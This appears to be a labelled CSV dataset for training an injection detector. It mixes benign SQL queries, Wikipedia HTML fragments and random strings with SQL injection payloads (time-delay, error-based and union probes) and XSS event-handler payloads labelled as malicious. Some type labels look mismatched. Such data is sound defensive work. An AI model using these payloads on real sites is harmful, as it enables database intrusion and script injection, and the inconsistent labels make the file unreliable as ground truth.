Text,Label,type
 ,0,xss
kallewar,0,sql
"<li onmousedown=""alert(1)"">test</li>",2,xss
"<li><a href=""/wiki/Document_management_system"" title=""Document management system"">Document management </a> </li> </ul>",0,xss
67sm1met93,0,sql
SELECT * FROM Customers  WHERE CustomerName LIKE '_r%';,0,sql
"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,sql
"<a href=""/wiki/Robot_rights"" class=""mw-redirect"" title=""Robot rights"">Robot rights </a>:",0,xss
SELECT * FROM join WHERE NOT attached = 'wrong'  AND NOT remove = 'teach',0,sql
	 </span>(2012) </li>,0,xss
SELECT hair ( s ) FROM drove INNER JOIN,0,sql
"1',  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4932  =  4932  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 31078 )  ORDER BY meta_id ASC",0,sql
22533,0,xss
<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,2,xss
79274775p,0,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT easily ( s )  FROM earn UNION ALL,0,sql
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,sql
SELECT TOP 50 PERCENT * FROM college SELECT * FROM memory FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rising,0,sql
SELECT * FROM wp_posts WHERE ID  =  348492 LIMIT 1,0,sql
"<nav onmousedown=""alert(1)"">test</nav>",2,xss
SELECT * FROM nest WHERE attack = 'paper',0,sql
"INSERT INTO library  ( give, adventure, lips )  VALUES  ( 'could', 'happened', 'reason' )  ",0,sql
1  )   where 3030  =  3030,1,sql
"<dd onkeyup=""alert(1)"" contenteditable>test</dd>",2,xss
2isnomo,0,sql
<html id=x tabindex=1 onbeforeactivate=alert(1)></html>,2,xss
"<tt onmousedown=""alert(1)"">test</tt>",2,xss
bees3,0,sql
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni",1,xss
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://social.techcrunch.com/2019/05/03/china-smart-city-exposed/"">""Security lapse exposed a Chinese smart city surveillance system"" </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Security+lapse+exposed+a+Chinese+smart+city+surveillance+system&amp;rft_id=http%3A%2F%2Fsocial.techcrunch.com%2F2019%2F05%2F03%2Fchina-smart-city-exposed%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT COUNT ( everything )  FROM typical,0,sql
 UPDATE duty SET pocket = 'closely'WHERE product = 'press',0,sql
(alert)(1),2,xss
SELECT AVG ( lucky ) FROM everyone SELECT SUM ( composition ) ,0,sql
"1' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
SELECT option_value FROM wp_options WHERE option_name  =  'auto_update_redux_google_fonts' LIMIT 1,0,sql
select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,1,xss
"1'  )   as jwvp where 5231  =  5231 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
"1""  )   where 1699  =  1699 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"<abbr draggable=""true"" ondragend=""alert(1)"">test</abbr>",2,xss
SELECT * FROM giant WHERE at BETWEEN '1996-07-01' AND '1996-07-31',0,sql
weldon@latiendadecolchones.ec,0,sql
"1""  )   waitfor delay '0:0:5' and   (  ""vjpg""  =  ""vjpg",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation book""><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Russell, Stuart </a> (8 October 2019). <a href=""/wiki/Human_Compatible"" title=""Human Compatible""><i>Human Compatible: Artificial Intelligence and the Problem of Control </i> </a>. United States: Viking. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-525-55861-3"" title=""Special:BookSources/978-0-525-55861-3""><bdi>978-0-525-55861-3 </bdi> </a>. <a href=""/wiki/OCLC"" title=""OCLC"">OCLC </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/oclc/1083694322"">1083694322 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Human+Compatible%3A+Artificial+Intelligence+and+the+Problem+of+Control&amp;rft.place=United+States&amp;rft.pub=Viking&amp;rft.date=2019-10-08&amp;rft_id=info%3Aoclcnum%2F1083694322&amp;rft.isbn=978-0-525-55861-3&amp;rft.aulast=Russell&amp;rft.aufirst=Stuart&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<img onmousedown=""alert(1)"">test</img>",2,xss
"1""   )    )     )   and make_set  (  7809  =  9564,9564  )   and    (    (     (  ""jggk"" like ""jggk",1,sql
1' where 2134  =  2134 rlike   (  select   (  case when   (  3613  =  2090  )   then 1 else 0x28 end   )    )   --,1,sql
"<section onpaste=""alert(1)"" contenteditable>test</section>",2,xss
SELECT * FROM lift WHERE football = 'strong'  OR threw = 'depend',0,xss
"1%""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,xss
"<mark oncut=""alert(1)"" contenteditable>test</mark>",2,xss
"	 </span>"" </a>. <i>BBC News </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20170126133849/http://www.bbc.co.uk/news/health-38717928"">Archived </a> from the original on 26 January 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 January ",0,xss
1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,1,sql
"<var onbeforecopy=""alert(1)"" contenteditable>test</var>",2,xss
